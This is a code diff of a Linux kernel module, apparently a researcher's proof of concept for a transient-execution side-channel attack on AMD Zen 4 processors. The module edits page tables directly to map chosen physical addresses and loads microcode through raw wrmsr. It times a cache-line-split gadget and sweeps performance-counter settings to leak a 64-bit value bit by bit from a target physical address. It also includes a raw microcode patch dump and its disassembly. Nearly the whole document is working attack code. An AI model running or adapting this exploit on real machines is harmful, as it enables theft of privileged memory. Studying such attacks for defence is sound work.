@@ -20,18 +20,16 @@
 #include <linux/gfp.h>
 #include <linux/mm.h>
 #include <linux/vmalloc.h>
-#include <linux/sched.h>     /* Required for cond_resched() */
-#include <linux/irqflags.h>  /* Required for local_irq_save() */
+#include <linux/sched.h>
+#include <linux/irqflags.h>
 #include <linux/string.h>
+#include <linux/types.h>
+#include <linux/firmware.h>
 #include <asm/processor.h>
 #include <asm/pgtable.h>
 #include <asm/page.h>
-#include <asm/io.h>
-#include <asm/fpu/api.h>     /* Required for kernel_fpu_begin() / end() */
-#include <asm/msr.h>         /* Required for wrmsrl and rdmsr */
-#include <linux/firmware.h>
-
-#include "opcode_wrapper.h"
+#include <asm/pgtable_64_types.h>
+#include <asm/msr.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("TSA Researcher");
@@ -47,30 +45,79 @@ MODULE_DESCRIPTION("Kernel module for scanning and extracting from Zen 4 PMCs us
 #define MAX_UMASK_ID 0xFF
 
 struct pmc_candidate {
-    int event;
-    int umask;
+	int event;
+	int umask;
 };
 
 /* ------------------------------------------------------------------ */
 /* Configuration (Fill in your target VAs here)                       */
 /* ------------------------------------------------------------------ */
-#define BASE_VA      0xFF00000000000000ull
+#define BASE_VA 0xFFFF000000000000ull
 
-#define PAGE_OFFSET_CACHED 0xb20 //start of microcode patch data within the page, which is cached and can be used for the attack
+/*
 
-static uint64_t PHYS_BASE = 0;
-static uint64_t VICTIM_VA = 0;
-static uint64_t ATTACK_VA = 0;
-static uint64_t SECRET_VALUE = 0;
+==== RAW MICROCODE PATCH ====
+0x00128fea 28200014 
+0x40080004 20490c54 
+0x84080001 24262d00 
+0x842785c8 0c121c00 
+0x2c280d5a 08021fe0 
+0x00029c20 000801bd 
+0x28589c80 2c080081 
+0x0c021c00 000801bd 
+0x242f2080 84278700 
+0x00120703 007f9c00 
+0x00000000 08505c04   
+0x0420941f 2c289c14
+0x00000000 00000000 
+0x04278728 00128df6
+0x007f9c00 00000000
+0x007f9c00 00000000
+0x007f9c00 00000000
+0xa0501c14 00200000
+0x0000000 10c011c40 
 
-#define CHASE_VA     (BASE_VA + 0x0000700000002000ULL)
+==== DISASSEMBLED INSTRUCTION SEQUENCE ====
+.quad 60, 00128df6 	
+ld.p    	vs:[reg0+reg1], reg8
+nop.q 
+nop.q 
+nop.q 
+
+.quad 61, 0x242f2080 	
+<bad>.w 
+<bad>   	vs:[reg0+reg0], reg8
+mov         msr1:[reg1 + reg1 + 0x1f], reg8
+nop.q 
+
+.quad 62, 0x08021fe0 	
+<bad>.bp	reg1, 1:[reg1+reg1+0x300]
+<bad>.q 
+ld      	vs:[reg11+reg0+0x81], reg0
+<bad>   	0x1bd
+
+.quad 63, 0x00128fea	
+sub2        reg0, reg11, 0xd5a 
+<bad>.p 	reg1, 1:[reg1+reg1+0x1c8]
+ld.p    	vs:[reg1+reg0+0x1], reg9
+ld.b    	vs:[rax+reg0+0x4], reg8
+*/
+
+
+static uint64_t tsa_phys_base;
+static uint64_t tsa_victim_va;
+static uint64_t tsa_attack_va;
+static uint64_t tsa_secret_value;
+static uint64_t PAGE_OFFSET_CACHED;
+
+#define CHASE_VA (BASE_VA + 0x0000880000002000ULL)
 
 
 #define PHYS_RESERVED_BASE 0x300000000ULL
 
 #define MAP_SIZE           4096
 #define N_SECRET_BITS      64
-#define SWEEP_PROBES       500
+#define SWEEP_PROBES       150
 
 /* ------------------------------------------------------------------ */
 /* User-Provided Page Table Manipulation Snippet                      */
@@ -80,79 +127,63 @@ static uint64_t SECRET_VALUE = 0;
 #define PAGE_USER 0x4
 #define PAGE_SIZE_4K 4096
 
-static inline unsigned long read_cr3(void) {
-    unsigned long cr3;
-    asm volatile("mov %%cr3, %0" : "=r"(cr3));
-    return cr3;
+static inline unsigned long read_cr3(void)
+{
+	unsigned long cr3;
+
+	asm volatile("mov %%cr3, %0" : "=r"(cr3));
+	return cr3;
 }
 
-static void map_physical_to_virtual(unsigned long phys_addr, unsigned long virt_addr, u64 addtional_pte_flags) {
-    unsigned long *pml5, *pml4, *pdp, *pd, *pt;
-    unsigned long index5, index4, index3, index2, index1;
+static void map_physical_to_virtual(unsigned long phys_addr,
+				    unsigned long virt_addr,
+				    u64 additional_pte_flags)
+{
+	unsigned long *pml5, *pml4, *pdp, *pd, *pt;
+	unsigned long index5, index4, index3, index2, index1;
 
-    pml5 = (unsigned long *)__va(read_cr3() & ~0xFFFull);
+	pml5 = (unsigned long *)__va(read_cr3() & ~0xfffUL);
 
-    index5 = (virt_addr >> 48) & 0x1FF;
-    index4 = (virt_addr >> 39) & 0x1FF;
-    index3 = (virt_addr >> 30) & 0x1FF;
-    index2 = (virt_addr >> 21) & 0x1FF;
-    index1 = (virt_addr >> 12) & 0x1FF;
+	index5 = (virt_addr >> 48) & 0x1ff;
+	index4 = (virt_addr >> 39) & 0x1ff;
+	index3 = (virt_addr >> 30) & 0x1ff;
+	index2 = (virt_addr >> 21) & 0x1ff;
+	index1 = (virt_addr >> 12) & 0x1ff;
 
-    if (!pml5[index5]) {
-        pml5[index5] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
-    }
-    pml4 = (unsigned long *)__va(pml5[index5] & PAGE_MASK);
-    if (!pml4[index4]) {
-        pml4[index4] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
-    }
-    pdp = (unsigned long *)__va(pml4[index4] & PAGE_MASK);
-    if (!pdp[index3]) {
-        pdp[index3] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
-    }
-    pd = (unsigned long *)__va(pdp[index3] & PAGE_MASK);
-    if (!pd[index2]) {
-        pd[index2] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
-    }
-    pt = (unsigned long *)__va(pd[index2] & PAGE_MASK);
-    if (!pt[index1]) {
-        pt[index1] = (phys_addr & PAGE_MASK) | PAGE_PRESENT | PAGE_RW | addtional_pte_flags;
-    } else {
-        pt[index1] = (phys_addr & PAGE_MASK) | PAGE_PRESENT | PAGE_RW | addtional_pte_flags;
-    }
+	if (!pml5[index5])
+		pml5[index5] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
 
+	pml4 = (unsigned long *)__va(pml5[index5] & PAGE_MASK);
+	if (!pml4[index4])
+		pml4[index4] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
 
-    smp_wmb();
-    asm volatile("invlpg (%0)" ::"r"(virt_addr) : "memory");
+	pdp = (unsigned long *)__va(pml4[index4] & PAGE_MASK);
+	if (!pdp[index3])
+		pdp[index3] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
+
+	pd = (unsigned long *)__va(pdp[index3] & PAGE_MASK);
+	if (!pd[index2])
+		pd[index2] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
+
+	pt = (unsigned long *)__va(pd[index2] & PAGE_MASK);
+	pt[index1] = (phys_addr & PAGE_MASK) | PAGE_PRESENT | PAGE_RW | additional_pte_flags;
+
+	smp_wmb();
+	asm volatile("invlpg (%0)" ::"r"(virt_addr) : "memory");
 }
 
 /* ------------------------------------------------------------------ */
 /* Low-level CPU primitives                                           */
 /* ------------------------------------------------------------------ */
-static inline void mfence_lfence(void) {
-    __asm__ volatile("mfence\nlfence" : : : "memory");
-}
-
-static inline void flush_l1d(void)
+static inline void mfence_lfence(void)
 {
-    uint32_t lo = 1;
-    uint32_t hi = 0;
-
-    asm volatile(
-        "wrmsr\n\t"
-        "mfence\n\t"
-        "lfence\n\t"
-        :
-        : "c"(0x10b), "a"(lo), "d"(hi)
-        : "memory");
+	__asm__ volatile("mfence\nlfence" : : : "memory");
 }
 
 
 /* ------------------------------------------------------------------ */
 /* Patch-Loader                                                       */
 /* ------------------------------------------------------------------ */
-#define MSR_AMD64_PATCH_LEVEL 0x0000008B
-#define MSR_AMD64_PATCH_LOADER 0xC0010020
-
 #define UCODE_MAGIC 0x00414d44 /* "AMD\0" little-endian */
 #define UCODE_EQUIV_CPU_TABLE 0x00000000
 #define UCODE_UCODE_TYPE 0x00000001
@@ -160,43 +191,39 @@ static inline void flush_l1d(void)
 #define CONTAINER_HDR_SIZE 12
 #define SECTION_HDR_SIZE 8
 
-struct equiv_cpu_entry
-{
-    u32 installed_cpu;
-    u32 fixed_errata_mask;
-    u32 fixed_errata_compare;
-    u16 equiv_cpu;
-    u16 res;
+struct equiv_cpu_entry {
+	u32 installed_cpu;
+	u32 fixed_errata_mask;
+	u32 fixed_errata_compare;
+	u16 equiv_cpu;
+	u16 res;
 } __packed;
 
-struct microcode_header_amd
-{
-    u32 data_code;
-    u32 patch_id;
-    u16 mc_patch_data_id;
-    u8 mc_patch_data_len;
-    u8 init_flag;
-    u32 mc_patch_data_checksum;
-    u32 nb_dev_id;
-    u32 sb_dev_id;
-    u16 processor_rev_id;
-    u8 nb_rev_id;
-    u8 sb_rev_id;
-    u8 bios_api_rev;
-    u8 reserved1[3];
-    u32 match_reg[8];
+struct microcode_header_amd {
+	u32 data_code;
+	u32 patch_id;
+	u16 mc_patch_data_id;
+	u8 mc_patch_data_len;
+	u8 init_flag;
+	u32 mc_patch_data_checksum;
+	u32 nb_dev_id;
+	u32 sb_dev_id;
+	u16 processor_rev_id;
+	u8 nb_rev_id;
+	u8 sb_rev_id;
+	u8 bios_api_rev;
+	u8 reserved1[3];
+	u32 match_reg[8];
 } __packed;
 
-struct microcode_amd
-{
-    struct microcode_header_amd hdr;
-    unsigned int mpb[];
+struct microcode_amd {
+	struct microcode_header_amd hdr;
+	unsigned int mpb[];
 } __packed;
 
-struct selected_patch
-{
-    struct microcode_amd *mc;
-    u32 patch_size;
+struct selected_patch {
+	struct microcode_amd *mc;
+	u32 patch_size;
 };
 
 static u32 my_cpuid_1_eax(void)
@@ -270,120 +297,128 @@ static bool verify_container(const u8 *buf, size_t size)
 }
 
 static struct microcode_amd *find_matching_zen_patch(const u8 *data,
-                                                     size_t size,
-                                                     u32 cpuid_eax,
-                                                     u32 *patch_size_out)
+						     size_t size,
+						     u32 cpuid_eax,
+						     u32 *patch_size_out)
 {
-    const u8 *p = data;
-    size_t left = size;
+	const u8 *p = data;
+	size_t left = size;
 
-    while (left >= CONTAINER_HDR_SIZE)
-    {
-        const u32 *container_hdr = (const u32 *)p;
-        u32 magic;
-        u32 first_type;
-        u32 first_size;
-        const u8 *q;
-        size_t qleft;
+	struct microcode_amd *best_mc = NULL;
+	u32 best_patch_size = 0;
+	u32 best_patch_id = 0;
 
-        magic = container_hdr[0];
-        first_type = container_hdr[1];
-        first_size = container_hdr[2];
+	if (patch_size_out)
+		*patch_size_out = 0;
 
-        if (magic != UCODE_MAGIC)
-        {
-            pr_err("bad AMD microcode container magic: 0x%08x\n", magic);
-            return NULL;
-        }
+	while (left >= CONTAINER_HDR_SIZE) {
+		const u32 *container_hdr = (const u32 *)p;
+		u32 magic;
+		u32 first_size;
+		const u8 *q;
+		size_t qleft;
 
-        if (left < CONTAINER_HDR_SIZE + first_size)
-        {
-            pr_err("truncated first section\n");
-            return NULL;
-        }
+		magic = container_hdr[0];
+		first_size = container_hdr[2];
+
+		if (magic != UCODE_MAGIC) {
+			pr_err("bad AMD microcode container magic: 0x%08x\n", magic);
+			return best_mc;
+		}
+
+		if (left < CONTAINER_HDR_SIZE + first_size) {
+			pr_err("truncated first section\n");
+			return best_mc;
+		}
 
         /*
          * For fam17h/19h/1Ah Linux does not need the equivalence table
          * for matching, but the container still has a first section.
          * Skip it, then scan ucode patch sections.
          */
-        q = p + CONTAINER_HDR_SIZE + first_size;
-        qleft = left - CONTAINER_HDR_SIZE - first_size;
+		q = p + CONTAINER_HDR_SIZE + first_size;
+		qleft = left - CONTAINER_HDR_SIZE - first_size;
 
-        while (qleft >= SECTION_HDR_SIZE)
-        {
-            const u32 *sec = (const u32 *)q;
-            u32 sec_type = sec[0];
-            u32 sec_size = sec[1];
-            struct microcode_amd *mc;
-            u32 patch_cpuid;
+		while (qleft >= SECTION_HDR_SIZE) {
+			const u32 *sec = (const u32 *)q;
+			u32 sec_type = sec[0];
+			u32 sec_size = sec[1];
+			struct microcode_amd *mc;
+			u32 patch_cpuid;
 
-            if (sec_type != UCODE_UCODE_TYPE)
-            {
-                /*
-                 * Probably start of another glued container or unknown section.
-                 * Stop this container scan.
-                 */
-                break;
-            }
+			if (sec_type != UCODE_UCODE_TYPE) {
+				/*
+				 * Probably start of another glued container or
+				 * unknown section. Stop this container scan.
+				 */
+				break;
+			}
 
-            if (sec_size < sizeof(struct microcode_header_amd))
-            {
-                pr_err("patch section too small: %u\n", sec_size);
-                return NULL;
-            }
+			if (sec_size < sizeof(struct microcode_header_amd)) {
+				pr_err("patch section too small: %u\n", sec_size);
+				return best_mc;
+			}
 
-            if (qleft < SECTION_HDR_SIZE + sec_size)
-            {
-                pr_err("truncated patch section\n");
-                return NULL;
-            }
+			if (qleft < SECTION_HDR_SIZE + sec_size) {
+				pr_err("truncated patch section\n");
+				return best_mc;
+			}
 
-            mc = (struct microcode_amd *)(q + SECTION_HDR_SIZE);
+			mc = (struct microcode_amd *)(q + SECTION_HDR_SIZE);
 
-            if (mc->hdr.nb_dev_id || mc->hdr.sb_dev_id)
-            {
-                pr_info("skip chipset-specific patch 0x%08x\n",
-                        mc->hdr.patch_id);
-                goto next_patch;
-            }
+			if (mc->hdr.nb_dev_id || mc->hdr.sb_dev_id) {
+				pr_info("skip chipset-specific patch 0x%08x\n",
+					mc->hdr.patch_id);
+				goto next_patch;
+			}
 
-            patch_cpuid = amd_patch_id_to_cpuid_eax(mc->hdr.patch_id);
+			patch_cpuid = amd_patch_id_to_cpuid_eax(mc->hdr.patch_id);
 
-            pr_info("candidate patch_id=0x%08x patch_cpuid=0x%08x size=%u\n",
-                    mc->hdr.patch_id, patch_cpuid, sec_size);
+			pr_info("candidate patch_id=0x%08x patch_cpuid=0x%08x size=%u\n",
+				mc->hdr.patch_id, patch_cpuid, sec_size);
 
-            if (patch_cpuid == cpuid_eax)
-            {
-                *patch_size_out = sec_size;
-                return mc;
-            }
+			if (patch_cpuid == cpuid_eax &&
+			    (!best_mc || mc->hdr.patch_id > best_patch_id)) {
+				best_mc = mc;
+				best_patch_id = mc->hdr.patch_id;
+				best_patch_size = sec_size;
 
-        next_patch:
-            q += SECTION_HDR_SIZE + sec_size;
-            qleft -= SECTION_HDR_SIZE + sec_size;
-        }
+				pr_info("new best matching patch: patch_id=0x%08x size=%u\n",
+					best_patch_id, best_patch_size);
+			}
+
+next_patch:
+			q += SECTION_HDR_SIZE + sec_size;
+			qleft -= SECTION_HDR_SIZE + sec_size;
+		}
 
         /*
          * If there are multiple AMD containers glued together, try to advance.
          * This is intentionally conservative.
          */
-        if (qleft == left)
-            break;
+		if (qleft == 0)
+			break;
 
-        if (qleft == 0)
-            break;
+		p = q;
+		left = qleft;
+	}
 
-        p = q;
-        left = qleft;
-    }
+	if (best_mc) {
+		if (patch_size_out)
+			*patch_size_out = best_patch_size;
 
-    return NULL;
+		pr_info("selected newest matching patch: patch_id=0x%08x size=%u\n",
+			best_patch_id, best_patch_size);
+	} else {
+		pr_info("no matching Zen microcode patch found for cpuid_eax=0x%08x\n",
+			cpuid_eax);
+	}
+
+	return best_mc;
 }
 
 static const struct firmware *fw;
-struct opcode_result out;
-struct microcode_amd *mc;
+static struct microcode_amd *mc;
 
 
 
@@ -391,10 +426,21 @@ struct microcode_amd *mc;
 /* Gadget — Cache-Line Split Latency                                  */
 /* ------------------------------------------------------------------ */
 
-static noinline __aligned(4096) uint64_t probe_D2(volatile uint8_t *victim,
-                                                   volatile uint8_t *target,
-                                                   uint64_t bit_idx,
-                                                   volatile uint64_t *chase_head)
+static inline void __maybe_unused flush_l1d(void)
+{
+    asm volatile(
+        "wrmsr\n\t"
+        "mfence\n\t"
+        "lfence\n\t"
+        :
+        : "c"(0x10b), "a"(1u), "d"(0u)
+        : "memory");
+}
+
+static noinline __aligned(4096) uint64_t probe_d2(volatile uint8_t *victim,
+						  volatile uint8_t *target,
+						  uint64_t bit_idx,
+						  volatile uint64_t *chase_head)
 {
     uint64_t elapsed;
     unsigned long flags;
@@ -408,14 +454,14 @@ static noinline __aligned(4096) uint64_t probe_D2(volatile uint8_t *victim,
                      "lfence\n\t" :: "r"(chase_head + 128) : "rax", "memory");
 
     asm volatile("invlpg (%0)" :: "r"(target) : "memory");
-    flush_l1d();
-    mfence_lfence();
     mfence_lfence();
 
     if (victim) {
         __asm__ volatile("movq (%0),%%rax" :: "r"(victim) : "rax", "memory");
     } else {
-        run_selected_opcode(OP_WRMSR, MSR_AMD64_PATCH_LOADER, &mc->hdr.data_code, &out);
+        __asm__ volatile("wrmsr" :: "c"(MSR_AMD64_PATCH_LOADER),
+                         "a"((u64)&mc->hdr.data_code & 0xffffffff),
+                         "d"((u64)&mc->hdr.data_code >> 32) : "memory");
     }
 
     __asm__ volatile(
@@ -423,14 +469,14 @@ static noinline __aligned(4096) uint64_t probe_D2(volatile uint8_t *victim,
         "lfence\n\t"
         "rdmsr\n\t"
         "lfence\n\t"
-
+        
         "movq %%rax,%%r8\n\t"
         "movq %%rdx,%%r11\n\t"
 
-        "movb %b[bit], %%cl\n\t"
+        "movb %b[bit], %%cl\n\t"    
 
-        "movq (%[tgt]), %%r9\n\t"
-        "shrq %%cl, %%r9\n\t"
+        "movq (%[tgt]), %%r9\n\t"   
+        "shrq %%cl, %%r9\n\t"       
         "andq $1, %%r9\n\t"
 
         /* AMPLIFICATION: Conditional Cache-Line Split via LODSQ */
@@ -454,13 +500,11 @@ static noinline __aligned(4096) uint64_t probe_D2(volatile uint8_t *victim,
         "shlq $32,%%rdx\n\t"
         "orq %%rdx,%%rax\n\t"
         "subq %%r8,%%rax\n\t"
-
+        
         : "=&a"(elapsed)
-        : [tgt] "r"(target),
-          [bit] "r"(bit_idx),
-          [chase] "r"(chase_head)
-        : "rcx", "rdx", "rsi", "r8", "r9", "r10", "r11", "r12", "r13", "memory");
-
+        : [tgt]"r"(target), [bit]"r"(bit_idx), [chase]"r"(chase_head)
+        : "rcx","rdx","rsi","r8","r9","r10","r11","r12","r13","memory");
+    
     local_irq_restore(flags);
     return elapsed;
 }
@@ -713,20 +757,20 @@ static void fast_measure_interleaved_swapped(volatile uint8_t *victim,
     for (i = 0; i < SWEEP_PROBES; i += 2) {
         *(volatile uint32_t *)victim = 0;
         mfence_lfence();
-        times0[i] = probe_D2(victim, target, 3, chase);
+        times0[i] = probe_d2(victim, target, 3, chase);
 
         *(volatile uint32_t *)victim = 0xffffffff;
         mfence_lfence();
-        times1[i] = probe_D2(victim, target, 3, chase);
+        times1[i] = probe_d2(victim, target, 3, chase);
 
         if (i + 1 < SWEEP_PROBES) {
             *(volatile uint32_t *)victim = 0xffffffff;
             mfence_lfence();
-            times1[i + 1] = probe_D2(victim, target, 3, chase);
+            times1[i + 1] = probe_d2(victim, target, 3, chase);
 
             *(volatile uint32_t *)victim = 0;
             mfence_lfence();
-            times0[i + 1] = probe_D2(victim, target, 3, chase);
+            times0[i + 1] = probe_d2(victim, target, 3, chase);
         }
     }
 }
@@ -774,7 +818,7 @@ static bit_res_t measure_single_bit_otsu(volatile uint8_t *victim,
                                          const calib_t *cal)
 {
     for (int i = 0; i < SWEEP_PROBES; i++) {
-        times[i] = probe_D2(victim, target, bit_idx, chase);
+        times[i] = probe_d2(victim, target, bit_idx, chase);
     }
 
     return classify_samples_otsu(times, SWEEP_PROBES, cal);
@@ -786,14 +830,13 @@ static int run_extraction(volatile uint8_t *victim,
                           const calib_t *cal,
                           uint64_t *times)
 {
-    uint64_t secret = SECRET_VALUE;
+    uint64_t secret = tsa_secret_value;
     int b, correct = 0;
     uint64_t predicted_word = 0;
 
     for (b = 0; b < N_SECRET_BITS; b++) {
         int true_bit = (secret >> b) & 1;
         bit_res_t res;
-
         res = measure_single_bit_otsu(victim, target, b, chase, times, cal);
 
         if (res.pred_bit == true_bit)
@@ -804,33 +847,9 @@ static int run_extraction(volatile uint8_t *victim,
 
     }
 
-    if(predicted_word != 0x0 && predicted_word != 0xffffffffffffffff)
-        pr_info("[+] Predicted: 0x%016llx \n", (unsigned long long)predicted_word);
-
+    pr_info("[+] Predicted: 0x%016llx \n", (unsigned long long)predicted_word);
     return correct;
 }
-
-#define BYTES_PER_LINE 16
-static void __maybe_unused hexdump(const void *addr, size_t len)
-{
-    const unsigned char *ptr = addr;
-    size_t i, j;
-
-    for (i = 0; i < len; i += BYTES_PER_LINE)
-    {
-        printk(KERN_INFO "%08lx: ", (unsigned long)(ptr + i));
-        for (j = 0; j < BYTES_PER_LINE; j++)
-        {
-            if (i + j < len)
-                printk(KERN_CONT "%02x ", ptr[i + j]);
-            else
-                printk(KERN_CONT "   ");
-        }
-
-        printk(KERN_CONT " | \n");
-    }
-}
-
 
 static int kthread_tsa_main(void *data)
 {
@@ -869,11 +888,9 @@ static int kthread_tsa_main(void *data)
             &mc->hdr.data_code,
             patch_size);
     
-    
-    hexdump((u8 *)mc + sizeof(struct microcode_header_amd), 196);
 
-    volatile uint8_t *victim = (volatile uint8_t *)VICTIM_VA;
-    volatile uint8_t *attack = (volatile uint8_t *)ATTACK_VA;
+    volatile uint8_t *victim = (volatile uint8_t *)tsa_victim_va;
+    volatile uint8_t *attack = (volatile uint8_t *)tsa_attack_va;
     volatile uint8_t *chase_region = (volatile uint8_t *)CHASE_VA;
     volatile uint64_t *chase1, *chase2;
     int evt, umask, correct;
@@ -886,8 +903,8 @@ static int kthread_tsa_main(void *data)
     pr_info("[+] Mapping Virtual Addresses to Physical Base: 0x%llx\n",
             (unsigned long long)PHYS_RESERVED_BASE);
 
-    map_physical_to_virtual(PHYS_RESERVED_BASE, VICTIM_VA, 0);
-    map_physical_to_virtual(PHYS_RESERVED_BASE + 0x200000, ATTACK_VA, 0);
+    map_physical_to_virtual(PHYS_RESERVED_BASE, tsa_victim_va, 0);
+    map_physical_to_virtual(PHYS_RESERVED_BASE + 0x200000, tsa_attack_va, 0);
     map_physical_to_virtual(PHYS_RESERVED_BASE + 0x800000, CHASE_VA, 0);
     map_physical_to_virtual(PHYS_RESERVED_BASE + 0x801000, CHASE_VA + MAP_SIZE, 0);
 
@@ -912,22 +929,20 @@ static int kthread_tsa_main(void *data)
     }
 
     pr_info("\n[+] COMMENCING BRUTE FORCE ITERATION (Events 0x00-0xFF, Umasks 0x00-0xFF)\n");
-    pr_info("    Target Accuracy: > 56 / 64 bits\n");
     pr_info("    --------------------------------------------------------------\n");
 
-    for (evt = 0x01; evt < MAX_EVENT_ID; evt++) {
+    for (evt = 0x76; evt <= 0x76; evt++) {
         if ((evt % 16) == 0)
             pr_info("[*] Sweeping Event Base 0x%02X...\n", evt);
 
         
-        for (umask = 0x0; umask < MAX_UMASK_ID; umask++) {
+        for (umask = 0x0; umask <= MAX_UMASK_ID; umask++) {
             uint64_t config;
             config = (1ULL << 22)
                    | (1ULL << 17)
                    | (1ULL << 16)
                    | ((uint64_t)umask << 8)
                    | (uint64_t)evt;
-
 
             wrmsrl(MSR_ZEN4_PERF_CTL0, 0ULL);
             wrmsrl(MSR_ZEN4_PERF_CTR0, 0ULL);
@@ -936,27 +951,12 @@ static int kthread_tsa_main(void *data)
             attack_cal = run_test_case(victim, attack, chase1, times0, times1);
 
             if (attack_cal.threshold != 0 && attack_cal.mean0 != attack_cal.mean1) {
-                correct = run_extraction(0, attack + PAGE_OFFSET_CACHED, chase1, &attack_cal, times0);
-
-                if (0) {
-                    pr_info("[+] VALID PMC FOUND: [E: 0x%02X | U: 0x%02X] -> Accuracy: %d / 64 bits | threshold=%llu mean0=%llu mean1=%llu one_is_high=%d\n",
-                            evt,
-                            umask,
-                            correct,
-                            (unsigned long long)attack_cal.threshold,
-                            (unsigned long long)attack_cal.mean0,
-                            (unsigned long long)attack_cal.mean1,
-                            attack_cal.one_is_high);
-                    count++;
-                }
+                run_extraction(0, attack + PAGE_OFFSET_CACHED, chase1, &attack_cal, times0);
             }
 
+            cond_resched();
         }
-
-        cond_resched();
     }
-
-    pr_info("\n[+] Brute Force Sweep Found %d Valid PMCs.\n", count);
 
     vfree(times0);
     vfree(times1);
@@ -972,41 +972,55 @@ static int kthread_tsa_main(void *data)
 /* ------------------------------------------------------------------ */
 static struct task_struct *tsa_thread;
 
-static int __init tsa_init(void) {
+static inline uint64_t canonicalize_48(uint64_t va)
+{
+    va &= 0x0000ffffffffffffULL;
+
+    if (va & (1ULL << 47))
+        va |= 0xffff000000000000ULL;
+
+    return va;
+}
+
+static int __init tsa_init(void)
+{
+    uint64_t mask =
+        (1ULL << 13) | (1ULL << 26) |
+        (1ULL << 14) | (1ULL << 25);
+    int ret;
+
     pr_info("TSA-L1 Module Loaded.\n");
 
-    int ret = request_firmware(&fw, "amd-ucode/microcode_amd_fam19h.bin", NULL);
+    ret = request_firmware(&fw, "amd-ucode/microcode_amd_fam19h.bin", NULL);
     if (ret)
     {
         pr_err("request_firmware failed: %d\n", ret);
         return ret;
     }
 
+
     tsa_thread = kthread_create(kthread_tsa_main, NULL, "tsa_worker");
-
-    uint64_t mask =
-        (1ULL << 13) | (1ULL << 26) |   // u1
-        (1ULL << 14) | (1ULL << 25);    // u2
-
-
-    PHYS_BASE = 0x000ffffdf7002000;
-    SECRET_VALUE = 0x0;
-
-    VICTIM_VA = BASE_VA + PHYS_BASE;
-    ATTACK_VA = BASE_VA + PHYS_BASE ^ mask;
-
-    pr_info("    [*] Reserved Physical Base: 0x%llx\n", PHYS_BASE);
-    pr_info("    [*] Mapped Victim VA: 0x%llx\n", VICTIM_VA);
-    pr_info("    [*] Mapped Attack VA: 0x%llx\n", ATTACK_VA);
-    pr_info("    [*] Secret Value: 0x%016llx\n", SECRET_VALUE);
-
     if (IS_ERR(tsa_thread)) {
         pr_err("Failed to create kthread.\n");
+        release_firmware(fw);
+        fw = NULL;
         return PTR_ERR(tsa_thread);
     }
 
+    //physical address to leak from
+    tsa_phys_base = 0x000ffffdf7001000;
+    PAGE_OFFSET_CACHED = 0xad0;
+
+    tsa_victim_va = canonicalize_48(tsa_phys_base);
+    tsa_attack_va = canonicalize_48(tsa_victim_va ^ mask);
+
+    pr_info("    [*] Reserved Physical Base: 0x%llx\n", tsa_phys_base);
+    pr_info("    [*] Mapped Victim VA: 0x%llx\n", tsa_victim_va);
+    pr_info("    [*] Mapped Attack VA: 0x%llx\n", tsa_attack_va);
+
     kthread_bind(tsa_thread, 0);
     wake_up_process(tsa_thread);
+    
     return 0;
 }
 
